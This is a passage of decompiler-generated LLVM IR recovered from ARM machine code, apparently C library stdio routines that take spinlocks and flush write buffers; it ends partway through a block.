  %v0_201f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_201f8 = load i32, i32* %r0.global-to-local, align 4
  %v2_201f8 = add i32 %v1_201f8, 8
  %v3_201f8 = inttoptr i32 %v2_201f8 to i32*
  store i32 %v0_201f8, i32* %v3_201f8, align 4
  %v0_201fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_201fc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_20200

dec_label_pc_20200:                               ; preds = %dec_label_pc_20230.dec_label_pc_20200_crit_edge, %dec_label_pc_201f8
  %v0_20200 = phi i32 [ %v0_20200.pre, %dec_label_pc_20230.dec_label_pc_20200_crit_edge ], [ %v0_201fc, %dec_label_pc_201f8 ]
  %v1_20200 = inttoptr i32 %v0_20200 to i32*
  %v2_20200 = load i32, i32* %v1_20200, align 4
  store i32 %v2_20200, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_20200, i32* %r2.global-to-local, align 4
  %v2_2020c131 = load i32, i32* %v1_20200, align 4
  store i32 %v2_2020c131, i32* %r3.global-to-local, align 4
  %v3_20210133 = icmp uge i32 %v2_2020c131, %v2_20200
  store i1 %v3_20210133, i1* %cpsr_c.global-to-local, align 1
  %v9_20210139 = icmp eq i32 %v2_2020c131, %v2_20200
  br i1 %v9_20210139, label %dec_label_pc_20218, label %dec_label_pc_20230

dec_label_pc_20218:                               ; preds = %dec_label_pc_20200, %dec_label_pc_20218.dec_label_pc_2020c_crit_edge
  %v0_20218140 = phi i32 [ %v1_20210.pre, %dec_label_pc_20218.dec_label_pc_2020c_crit_edge ], [ %v2_20200, %dec_label_pc_20200 ]
  store i32 %v0_20218140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_20228 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_20228, label %dec_label_pc_2022c, label %dec_label_pc_20218.dec_label_pc_2020c_crit_edge

dec_label_pc_20218.dec_label_pc_2020c_crit_edge:  ; preds = %dec_label_pc_20218
  %v0_2020c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_20210.pre = load i32, i32* @r4, align 4
  %v1_2020c = inttoptr i32 %v0_2020c.pre to i32*
  %v2_2020c = load i32, i32* %v1_2020c, align 4
  store i32 %v2_2020c, i32* %r3.global-to-local, align 4
  %v3_20210 = icmp uge i32 %v2_2020c, %v1_20210.pre
  store i1 %v3_20210, i1* %cpsr_c.global-to-local, align 1
  %v9_20210 = icmp eq i32 %v2_2020c, %v1_20210.pre
  br i1 %v9_20210, label %dec_label_pc_20218, label %dec_label_pc_20230

dec_label_pc_2022c:                               ; preds = %dec_label_pc_20218
  %v0_2022c = load i32, i32* @r4, align 4
  store i32 %v0_2022c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_20230

dec_label_pc_20230:                               ; preds = %dec_label_pc_20200, %dec_label_pc_20218.dec_label_pc_2020c_crit_edge, %dec_label_pc_2022c
  %v0_20238 = phi i32 [ %v0_2022c, %dec_label_pc_2022c ], [ %v2_2020c131, %dec_label_pc_20200 ], [ %v2_2020c, %dec_label_pc_20218.dec_label_pc_2020c_crit_edge ]
  %v1_20230 = phi i32 [ %v0_2022c, %dec_label_pc_2022c ], [ %v2_20200, %dec_label_pc_20200 ], [ %v1_20210.pre, %dec_label_pc_20218.dec_label_pc_2020c_crit_edge ]
  %v3_20230 = icmp uge i32 %v0_20238, %v1_20230
  store i1 %v3_20230, i1* %cpsr_c.global-to-local, align 1
  %v9_20230 = icmp eq i32 %v0_20238, %v1_20230
  br i1 %v9_20230, label %dec_label_pc_20238, label %dec_label_pc_20230.dec_label_pc_20200_crit_edge

dec_label_pc_20230.dec_label_pc_20200_crit_edge:  ; preds = %dec_label_pc_20230
  %v0_20200.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_20200

dec_label_pc_20238:                               ; preds = %dec_label_pc_20230
  %v2_20238 = icmp ne i32 %v1_20230, 0
  store i1 %v2_20238, i1* %cpsr_c.global-to-local, align 1
  %v7_2023c = icmp slt i32 %v1_20230, 2
  br i1 %v7_2023c, label %dec_label_pc_20258, label %dec_label_pc_20240

dec_label_pc_20240:                               ; preds = %dec_label_pc_20238
  %v0_20240 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_20240, i32* %r0.global-to-local, align 4
  %v0_20244 = load i32, i32* %r1.global-to-local, align 4
  %v1_20244 = add i32 %v0_20244, 129
  store i32 %v1_20244, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_20258

dec_label_pc_20258:                               ; preds = %dec_label_pc_201d0, %dec_label_pc_20240, %dec_label_pc_20238
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_2025c = load i32, i32* @r6, align 4
  %v2_2025c = add i32 %v0_2025c, 152
  %v3_2025c = inttoptr i32 %v2_2025c to i32*
  %v4_2025c = load i32, i32* %v3_2025c, align 4
  store i32 %v4_2025c, i32* %r5.global-to-local, align 4
  %v1_20260 = add i32 %v4_2025c, 8
  %v2_20260 = inttoptr i32 %v1_20260 to i32*
  %v3_20260 = load i32, i32* %v2_20260, align 4
  store i32 %v3_20260, i32* %r3.global-to-local, align 4
  %v1_20264 = load i32, i32* %r8.global-to-local, align 4
  %v3_20264 = icmp uge i32 %v3_20260, %v1_20264
  store i1 %v3_20264, i1* %cpsr_c.global-to-local, align 1
  %v9_20264 = icmp eq i32 %v3_20260, %v1_20264
  br i1 %v9_20264, label %dec_label_pc_202ac, label %dec_label_pc_2026c

dec_label_pc_2026c:                               ; preds = %dec_label_pc_20258
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_2025c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_20278123 = inttoptr i32 %v4_2025c to i32*
  %v2_20278124 = load i32, i32* %v1_20278123, align 4
  store i32 %v2_20278124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_2027c126 = icmp eq i32 %v2_20278124, 0
  br i1 %v9_2027c126, label %dec_label_pc_20284, label %dec_label_pc_2029c

dec_label_pc_20284:                               ; preds = %dec_label_pc_2026c, %dec_label_pc_20284.dec_label_pc_20278_crit_edge
  %v0_20284127 = phi i32 [ %v1_2027c.pre, %dec_label_pc_20284.dec_label_pc_20278_crit_edge ], [ 0, %dec_label_pc_2026c ]
  store i32 %v0_20284127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_20294 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_20294, label %dec_label_pc_20298, label %dec_label_pc_20284.dec_label_pc_20278_crit_edge

dec_label_pc_20284.dec_label_pc_20278_crit_edge:  ; preds = %dec_label_pc_20284
  %v0_20278.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2027c.pre = load i32, i32* @r4, align 4
  %v1_20278 = inttoptr i32 %v0_20278.pre to i32*
  %v2_20278 = load i32, i32* %v1_20278, align 4
  store i32 %v2_20278, i32* %r3.global-to-local, align 4
  %v3_2027c = icmp uge i32 %v2_20278, %v1_2027c.pre
  store i1 %v3_2027c, i1* %cpsr_c.global-to-local, align 1
  %v9_2027c = icmp eq i32 %v2_20278, %v1_2027c.pre
  br i1 %v9_2027c, label %dec_label_pc_20284, label %dec_label_pc_2029c

dec_label_pc_20298:                               ; preds = %dec_label_pc_20284
  %v0_20298 = load i32, i32* @r4, align 4
  store i32 %v0_20298, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2029c

dec_label_pc_2029c:                               ; preds = %dec_label_pc_2026c, %dec_label_pc_20284.dec_label_pc_20278_crit_edge, %dec_label_pc_20298
  %v0_2029c = phi i32 [ %v0_20298, %dec_label_pc_20298 ], [ %v2_20278124, %dec_label_pc_2026c ], [ %v2_20278, %dec_label_pc_20284.dec_label_pc_20278_crit_edge ]
  %v1_2029c = phi i32 [ %v0_20298, %dec_label_pc_20298 ], [ 0, %dec_label_pc_2026c ], [ %v1_2027c.pre, %dec_label_pc_20284.dec_label_pc_20278_crit_edge ]
  %v3_2029c = icmp uge i32 %v0_2029c, %v1_2029c
  store i1 %v3_2029c, i1* %cpsr_c.global-to-local, align 1
  %v9_2029c = icmp eq i32 %v0_2029c, %v1_2029c
  br i1 %v9_2029c, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_2029c
  %v1_202a0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_202a0, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_2029c, %bb67
  %v1_202a4 = xor i1 %v9_2029c, true
  call void @__pseudo_cond_branch(i1 %v1_202a4, i32 ptrtoint (i32* @global_var_1d8a0.575 to i32))
  %v0_202a8 = load i32, i32* %r8.global-to-local, align 4
  %v1_202a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_202a8 = add i32 %v1_202a8, 8
  %v3_202a8 = inttoptr i32 %v2_202a8 to i32*
  store i32 %v0_202a8, i32* %v3_202a8, align 4
  %v0_202b0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_202ac

dec_label_pc_202ac:                               ; preds = %dec_label_pc_20258, %bb68
  %v0_202bc = phi i32 [ %v0_2025c, %dec_label_pc_20258 ], [ %v0_202b0.pre, %bb68 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_202b0 = add i32 %v0_202bc, 152
  %v3_202b0 = inttoptr i32 %v2_202b0 to i32*
  %v4_202b0 = load i32, i32* %v3_202b0, align 4
  store i32 %v4_202b0, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_202b8 = add i32 %v4_202b0, 4
  %v2_202b8 = inttoptr i32 %v1_202b8 to i32*
  %v3_202b8 = load i32, i32* %v2_202b8, align 4
  store i32 %v3_202b8, i32* %r1.global-to-local, align 4
  %v2_202bc = add i32 %v0_202bc, 76
  %v3_202bc = inttoptr i32 %v2_202bc to i32*
  %v4_202bc = load i32, i32* %v3_202bc, align 4
  store i32 %v4_202bc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_202c0 = icmp eq i32 %v3_202b8, 0
  %v1_202c4 = inttoptr i32 %v4_202bc to i32*
  %v2_202c4 = load i32, i32* %v1_202c4, align 4
  store i32 %v2_202c4, i32* @r5, align 4
  br i1 %v2_202c0, label %dec_label_pc_202cc, label %dec_label_pc_2032c

dec_label_pc_202cc:                               ; preds = %dec_label_pc_202ac
  %v2_202cc = add i32 %v4_202b0, 8
  %v3_202cc = inttoptr i32 %v2_202cc to i32*
  store i32 0, i32* %v3_202cc, align 4
  %v0_202d0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_202d0, i32* @r7, align 4
  br label %dec_label_pc_202d4

dec_label_pc_202d4:                               ; preds = %dec_label_pc_20304.dec_label_pc_202d4_crit_edge, %dec_label_pc_202cc
  %v0_202d4 = phi i32 [ %v0_202d4.pre, %dec_label_pc_20304.dec_label_pc_202d4_crit_edge ], [ %v0_202d0, %dec_label_pc_202cc ]
  %v1_202d4 = inttoptr i32 %v0_202d4 to i32*
  %v2_202d4 = load i32, i32* %v1_202d4, align 4
  store i32 %v2_202d4, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_202d4, i32* %r2.global-to-local, align 4
  %v2_202e0111 = load i32, i32* %v1_202d4, align 4
  store i32 %v2_202e0111, i32* %r3.global-to-local, align 4
  %v3_202e4113 = icmp uge i32 %v2_202e0111, %v2_202d4
  store i1 %v3_202e4113, i1* %cpsr_c.global-to-local, align 1
  %v9_202e4119 = icmp eq i32 %v2_202e0111, %v2_202d4
  br i1 %v9_202e4119, label %dec_label_pc_202ec, label %dec_label_pc_20304

dec_label_pc_202ec:                               ; preds = %dec_label_pc_202d4, %dec_label_pc_202ec.dec_label_pc_202e0_crit_edge
  %v0_202ec120 = phi i32 [ %v1_202e4.pre, %dec_label_pc_202ec.dec_label_pc_202e0_crit_edge ], [ %v2_202d4, %dec_label_pc_202d4 ]
  store i32 %v0_202ec120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_202fc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_202fc, label %dec_label_pc_20300, label %dec_label_pc_202ec.dec_label_pc_202e0_crit_edge

dec_label_pc_202ec.dec_label_pc_202e0_crit_edge:  ; preds = %dec_label_pc_202ec
  %v0_202e0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_202e4.pre = load i32, i32* @r4, align 4
  %v1_202e0 = inttoptr i32 %v0_202e0.pre to i32*
  %v2_202e0 = load i32, i32* %v1_202e0, align 4
  store i32 %v2_202e0, i32* %r3.global-to-local, align 4
  %v3_202e4 = icmp uge i32 %v2_202e0, %v1_202e4.pre
  store i1 %v3_202e4, i1* %cpsr_c.global-to-local, align 1
  %v9_202e4 = icmp eq i32 %v2_202e0, %v1_202e4.pre
  br i1 %v9_202e4, label %dec_label_pc_202ec, label %dec_label_pc_20304

dec_label_pc_20300:                               ; preds = %dec_label_pc_202ec
  %v0_20300 = load i32, i32* @r4, align 4
  store i32 %v0_20300, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_20304

dec_label_pc_20304:                               ; preds = %dec_label_pc_202d4, %dec_label_pc_202ec.dec_label_pc_202e0_crit_edge, %dec_label_pc_20300
  %v0_2030c = phi i32 [ %v0_20300, %dec_label_pc_20300 ], [ %v2_202e0111, %dec_label_pc_202d4 ], [ %v2_202e0, %dec_label_pc_202ec.dec_label_pc_202e0_crit_edge ]
  %v1_20304 = phi i32 [ %v0_20300, %dec_label_pc_20300 ], [ %v2_202d4, %dec_label_pc_202d4 ], [ %v1_202e4.pre, %dec_label_pc_202ec.dec_label_pc_202e0_crit_edge ]
  %v3_20304 = icmp uge i32 %v0_2030c, %v1_20304
  store i1 %v3_20304, i1* %cpsr_c.global-to-local, align 1
  %v9_20304 = icmp eq i32 %v0_2030c, %v1_20304
  br i1 %v9_20304, label %dec_label_pc_2030c, label %dec_label_pc_20304.dec_label_pc_202d4_crit_edge

dec_label_pc_20304.dec_label_pc_202d4_crit_edge:  ; preds = %dec_label_pc_20304
  %v0_202d4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_202d4

dec_label_pc_2030c:                               ; preds = %dec_label_pc_20304
  %v2_2030c = icmp ne i32 %v1_20304, 0
  store i1 %v2_2030c, i1* %cpsr_c.global-to-local, align 1
  %v7_20310 = icmp slt i32 %v1_20304, 2
  br i1 %v7_20310, label %dec_label_pc_2032cthread-pre-split, label %dec_label_pc_20314

dec_label_pc_20314:                               ; preds = %dec_label_pc_2030c
  %v0_20314 = load i32, i32* @r7, align 4
  store i32 %v0_20314, i32* %r0.global-to-local, align 4
  %v0_20318 = load i32, i32* %r1.global-to-local, align 4
  %v1_20318 = add i32 %v0_20318, 129
  store i32 %v1_20318, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2032cthread-pre-split

dec_label_pc_2032cthread-pre-split:               ; preds = %dec_label_pc_2030c, %dec_label_pc_20314
  %v0_20478.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_2032c

dec_label_pc_2032c:                               ; preds = %dec_label_pc_2032cthread-pre-split, %dec_label_pc_202ac
  %v0_20478.pr = phi i32 [ %v0_20478.pr.pr, %dec_label_pc_2032cthread-pre-split ], [ %v2_202c4, %dec_label_pc_202ac ]
  store i32 92, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2047818 = icmp eq i32 %v0_20478.pr, 0
  br i1 %v2_2047818, label %dec_label_pc_20480, label %dec_label_pc_2033c

dec_label_pc_2033c:                               ; preds = %dec_label_pc_2032c, %dec_label_pc_20474
  %v0_20364 = phi i32 [ %v3_20474, %dec_label_pc_20474 ], [ %v0_20478.pr, %dec_label_pc_2032c ]
  %v1_2033c = inttoptr i32 %v0_20364 to i16*
  %v2_2033c = load i16, i16* %v1_2033c, align 2
  %v3_2033c = zext i16 %v2_2033c to i32
  store i32 %v3_2033c, i32* %r3.global-to-local, align 4
  %v1_20340 = and i32 %v3_2033c, 64
  %v2_20340 = icmp eq i32 %v1_20340, 0
  br i1 %v2_20340, label %dec_label_pc_20474, label %dec_label_pc_20348

dec_label_pc_20348:                               ; preds = %dec_label_pc_2033c
  %v0_20348 = load i32, i32* @r6, align 4
  %v1_20348 = load i32, i32* %sb.global-to-local, align 4
  %v2_20348 = add i32 %v1_20348, %v0_20348
  %v3_20348 = inttoptr i32 %v2_20348 to i32*
  %v4_20348 = load i32, i32* %v3_20348, align 4
  store i32 %v4_20348, i32* %r3.global-to-local, align 4
  %v1_2034c = inttoptr i32 %v4_20348 to i32*
  %v2_2034c = load i32, i32* %v1_2034c, align 4
  store i32 %v2_2034c, i32* %r3.global-to-local, align 4
  %v2_20350 = icmp ugt i32 %v2_2034c, 1
  store i1 %v2_20350, i1* %cpsr_c.global-to-local, align 1
  %v7_20350 = icmp eq i32 %v2_2034c, 2
  br i1 %v7_20350, label %dec_label_pc_203b4, label %dec_label_pc_20358

dec_label_pc_20358:                               ; preds = %dec_label_pc_20348
  %v1_20358 = add i32 %v0_20364, 64
  %v2_20358 = inttoptr i32 %v1_20358 to i32*
  %v3_20358 = load i32, i32* %v2_20358, align 4
  store i32 %v3_20358, i32* %r3.global-to-local, align 4
  %v1_2035c = load i32, i32* %r8.global-to-local, align 4
  %v3_2035c = icmp uge i32 %v3_20358, %v1_2035c
  store i1 %v3_2035c, i1* %cpsr_c.global-to-local, align 1
  %v9_2035c = icmp eq i32 %v3_20358, %v1_2035c
  br i1 %v9_2035c, label %dec_label_pc_203a8, label %dec_label_pc_20364

dec_label_pc_20364:                               ; preds = %dec_label_pc_20358
  %v1_20364 = add i32 %v0_20364, 56
  store i32 %v1_20364, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_20364, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_2037486 = inttoptr i32 %v1_20364 to i32*
  %v2_2037487 = load i32, i32* %v1_2037486, align 4
  store i32 %v2_2037487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_2037894 = icmp eq i32 %v2_2037487, 0
  br i1 %v9_2037894, label %dec_label_pc_20380, label %dec_label_pc_20398

dec_label_pc_20380:                               ; preds = %dec_label_pc_20364, %dec_label_pc_20380.dec_label_pc_20374_crit_edge
  %v0_2038095 = phi i32 [ %v1_20378.pre, %dec_label_pc_20380.dec_label_pc_20374_crit_edge ], [ 0, %dec_label_pc_20364 ]
  store i32 %v0_2038095, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_20390 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_20390, label %dec_label_pc_20394, label %dec_label_pc_20380.dec_label_pc_20374_crit_edge

dec_label_pc_20380.dec_label_pc_20374_crit_edge:  ; preds = %dec_label_pc_20380
  %v0_20374.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_20378.pre = load i32, i32* @r4, align 4
  %v1_20374 = inttoptr i32 %v0_20374.pre to i32*
  %v2_20374 = load i32, i32* %v1_20374, align 4
  store i32 %v2_20374, i32* %r3.global-to-local, align 4
  %v3_20378 = icmp uge i32 %v2_20374, %v1_20378.pre
  store i1 %v3_20378, i1* %cpsr_c.global-to-local, align 1
  %v9_20378 = icmp eq i32 %v2_20374, %v1_20378.pre
  br i1 %v9_20378, label %dec_label_pc_20380, label %dec_label_pc_20398

dec_label_pc_20394:                               ; preds = %dec_label_pc_20380
  %v0_20394 = load i32, i32* @r4, align 4
  store i32 %v0_20394, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_20398

dec_label_pc_20398:                               ; preds = %dec_label_pc_20364, %dec_label_pc_20380.dec_label_pc_20374_crit_edge, %dec_label_pc_20394
  %v0_20398 = phi i32 [ %v0_20394, %dec_label_pc_20394 ], [ %v2_2037487, %dec_label_pc_20364 ], [ %v2_20374, %dec_label_pc_20380.dec_label_pc_20374_crit_edge ]
  %v1_20398 = phi i32 [ %v0_20394, %dec_label_pc_20394 ], [ 0, %dec_label_pc_20364 ], [ %v1_20378.pre, %dec_label_pc_20380.dec_label_pc_20374_crit_edge ]
  %v3_20398 = icmp uge i32 %v0_20398, %v1_20398
  store i1 %v3_20398, i1* %cpsr_c.global-to-local, align 1
  %v9_20398 = icmp eq i32 %v0_20398, %v1_20398
  br i1 %v9_20398, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_20398
  %v1_2039c = load i32, i32* @r7, align 4
  store i32 %v1_2039c, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_20398, %bb69
  %v1_203a0 = xor i1 %v9_20398, true
  call void @__pseudo_cond_branch(i1 %v1_203a0, i32 ptrtoint (i32* @global_var_1d8a0.575 to i32))
  %v0_203a4 = load i32, i32* %r8.global-to-local, align 4
  %v1_203a4 = load i32, i32* @r5, align 4
  %v2_203a4 = add i32 %v1_203a4, 64
  %v3_203a4 = inttoptr i32 %v2_203a4 to i32*
  store i32 %v0_203a4, i32* %v3_203a4, align 4
  %v0_203a8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_203a8

dec_label_pc_203a8:                               ; preds = %dec_label_pc_20358, %bb70
  %v0_203a8 = phi i32 [ %v0_20364, %dec_label_pc_20358 ], [ %v0_203a8.pre, %bb70 ]
  %v1_203a8 = add i32 %v0_203a8, 60
  %v2_203a8 = inttoptr i32 %v1_203a8 to i32*
  %v3_203a8 = load i32, i32* %v2_203a8, align 4
  %v1_203ac = add i32 %v3_203a8, 1
  store i32 %v1_203ac, i32* %r3.global-to-local, align 4
  store i32 %v1_203ac, i32* %v2_203a8, align 4
  %v0_203b4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_203b4

dec_label_pc_203b4:                               ; preds = %dec_label_pc_20348, %dec_label_pc_203a8
  %v0_203cc = phi i32 [ %v0_20364, %dec_label_pc_20348 ], [ %v0_203b4.pre, %dec_label_pc_203a8 ]
  %v1_203b4 = inttoptr i32 %v0_203cc to i16*
  %v2_203b4 = load i16, i16* %v1_203b4, align 2
  %v3_203b4 = zext i16 %v2_203b4 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_203bc = or i32 %v3_203b4, %stack_var_-44.1
  %v1_203c0 = xor i32 %v2_203bc, 320
  store i32 %v1_203c0, i32* %r3.global-to-local, align 4
  %v1_203c4 = and i32 %v1_203c0, 832
  %v2_203c4 = icmp eq i32 %v1_203c4, 0
  br i1 %v2_203c4, label %dec_label_pc_203cc, label %bb71

dec_label_pc_203cc:                               ; preds = %dec_label_pc_203b4
  store i32 %v0_203cc, i32* %r0.global-to-local, align 4
  %v1_203d0 = call i32 @__stdio_wcommit(i32 %v0_203cc)
  store i32 %v1_203d0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_203d4 = icmp eq i32 %v1_203d0, 0
  br i1 %v2_203d4, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_203cc
  %v1_203d8 = load i32, i32* @r5, align 4
  %v2_203d8 = inttoptr i32 %v1_203d8 to i16*
  %v3_203d8 = load i16, i16* %v2_203d8, align 2
  %v4_203d8 = zext i16 %v3_203d8 to i32
  store i32 %v4_203d8, i32* %r3.global-to-local, align 4
  %v2_203dc = add i32 %v1_203d8, 8
  %v3_203dc = inttoptr i32 %v2_203dc to i32*
  %v4_203dc = load i32, i32* %v3_203dc, align 4
  store i32 %v4_203dc, i32* %r2.global-to-local, align 4
  %v2_203e0 = and i32 %v4_203d8, 65471
  store i32 %v2_203e0, i32* %r3.global-to-local, align 4
  %v3_203e4 = add i32 %v1_203d8, 28
  %v4_203e4 = inttoptr i32 %v3_203e4 to i32*
  store i32 %v4_203dc, i32* %v4_203e4, align 4
  %v1_203e8 = load i32, i32* %r3.global-to-local, align 4
  %v2_203e8 = trunc i32 %v1_203e8 to i16
  %v3_203e8 = load i32, i32* @r5, align 4
  %v4_203e8 = inttoptr i32 %v3_203e8 to i16*
  store i16 %v2_203e8, i16* %v4_203e8, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_203cc
  %v1_203ec = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_203ec, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_203b4, %.thread7
  %v0_203f0 = load i32, i32* @r6, align 4
  %v1_203f0 = load i32, i32* %sb.global-to-local, align 4
  %v2_203f0 = add i32 %v1_203f0, %v0_203f0
  %v3_203f0 = inttoptr i32 %v2_203f0 to i32*
  %v4_203f0 = load i32, i32* %v3_203f0, align 4
  store i32 %v4_203f0, i32* %r3.global-to-local, align 4
  %v1_203f4 = inttoptr i32 %v4_203f0 to i32*
  %v2_203f4 = load i32, i32* %v1_203f4, align 4
  store i32 %v2_203f4, i32* %r3.global-to-local, align 4
  %v2_203f8 = icmp ugt i32 %v2_203f4, 1
  store i1 %v2_203f8, i1* %cpsr_c.global-to-local, align 1
  %v7_203f8 = icmp eq i32 %v2_203f4, 2
  br i1 %v7_203f8, label %dec_label_pc_20474, label %dec_label_pc_20400

dec_label_pc_20400:                               ; preds = %bb71
  %v0_20400 = load i32, i32* @r5, align 4
  %v1_20400 = add i32 %v0_20400, 60
  %v2_20400 = inttoptr i32 %v1_20400 to i32*
  %v3_20400 = load i32, i32* %v2_20400, align 4
  %v1_20404 = add i32 %v3_20400, -1
  store i32 %v1_20404, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_20408 = icmp eq i32 %v1_20404, 0
  store i32 %v1_20404, i32* %v2_20400, align 4
  br i1 %v2_20408, label %dec_label_pc_20414, label %dec_label_pc_20474

dec_label_pc_20414:                               ; preds = %dec_label_pc_20400
  %v0_20414 = load i32, i32* %r3.global-to-local, align 4
  %v1_20414 = load i32, i32* @r5, align 4
  %v2_20414 = add i32 %v1_20414, 64
  %v3_20414 = inttoptr i32 %v2_20414 to i32*
  store i32 %v0_20414, i32* %v3_20414, align 4
  %v0_20418 = load i32, i32* @r5, align 4
  %v1_20418 = add i32 %v0_20418, 56
  store i32 %v1_20418, i32* @r7, align 4
  br label %dec_label_pc_2041c

dec_label_pc_2041c:                               ; preds = %dec_label_pc_2044c.dec_label_pc_2041c_crit_edge, %dec_label_pc_20414
  %v0_20424 = phi i32 [ %v0_20424.pre, %dec_label_pc_2044c.dec_label_pc_2041c_crit_edge ], [ %v1_20418, %dec_label_pc_20414 ]
  %v0_2041c = phi i32 [ %v0_2041c.pre, %dec_label_pc_2044c.dec_label_pc_2041c_crit_edge ], [ %v0_20418, %dec_label_pc_20414 ]
  %v1_2041c = add i32 %v0_2041c, 56
  %v2_2041c = inttoptr i32 %v1_2041c to i32*
  %v3_2041c = load i32, i32* %v2_2041c, align 4
  store i32 %v3_2041c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_20424, i32* %r2.global-to-local, align 4
  %v1_2042897 = inttoptr i32 %v0_20424 to i32*
  %v2_2042898 = load i32, i32* %v1_2042897, align 4
  store i32 %v2_2042898, i32* %r3.global-to-local, align 4
  %v3_2042c100 = icmp uge i32 %v2_2042898, %v3_2041c
  store i1 %v3_2042c100, i1* %cpsr_c.global-to-local, align 1
  %v9_2042c106 = icmp eq i32 %v2_2042898, %v3_2041c
  br i1 %v9_2042c106, label %dec_label_pc_20434, label %dec_label_pc_2044c

dec_label_pc_20434:                               ; preds = %dec_label_pc_2041c, %dec_label_pc_20434.dec_label_pc_20428_crit_edge
  %v0_20434107 = phi i32 [ %v1_2042c.pre, %dec_label_pc_20434.dec_label_pc_20428_crit_edge ], [ %v3_2041c, %dec_label_pc_2041c ]
  store i32 %v0_20434107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_20444 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_20444, label %dec_label_pc_20448, label %dec_label_pc_20434.dec_label_pc_20428_crit_edge

dec_label_pc_20434.dec_label_pc_20428_crit_edge:  ; preds = %dec_label_pc_20434
  %v0_20428.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2042c.pre = load i32, i32* @r4, align 4
  %v1_20428 = inttoptr i32 %v0_20428.pre to i32*
  %v2_20428 = load i32, i32* %v1_20428, align 4
  store i32 %v2_20428, i32* %r3.global-to-local, align 4
  %v3_2042c = icmp uge i32 %v2_20428, %v1_2042c.pre
  store i1 %v3_2042c, i1* %cpsr_c.global-to-local, align 1
  %v9_2042c = icmp eq i32 %v2_20428, %v1_2042c.pre
  br i1 %v9_2042c, label %dec_label_pc_20434, label %dec_label_pc_2044c

dec_label_pc_20448:                               ; preds = %dec_label_pc_20434
  %v0_20448 = load i32, i32* @r4, align 4
  store i32 %v0_20448, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2044c

dec_label_pc_2044c:                               ; preds = %dec_label_pc_2041c, %dec_label_pc_20434.dec_label_pc_20428_crit_edge, %dec_label_pc_20448
